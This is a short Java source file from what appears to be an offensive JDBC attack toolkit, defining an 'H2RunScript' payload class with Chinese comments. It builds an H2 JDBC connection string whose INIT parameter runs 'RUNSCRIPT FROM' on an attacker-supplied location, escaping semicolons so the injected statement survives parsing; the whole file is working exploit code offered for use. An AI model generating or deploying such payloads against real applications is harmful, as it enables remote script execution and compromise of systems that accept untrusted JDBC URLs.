package cn.butler.jdbcattack.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;

public class H2RunScript implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String INITParameter = String.format("RUNSCRIPT FROM '%s';",command);
        //转义分号: 因为在H2的连接串中分号是SQL语句分隔符,所以INIT配置参数中所有的分号都要设置转义
        INITParameter = INITParameter.replace(";", "\\;"); // 替换反斜杠
        String runScriptTemplate = "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=" + INITParameter;
        return runScriptTemplate;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(H2RunScript.class, args);
    }
}
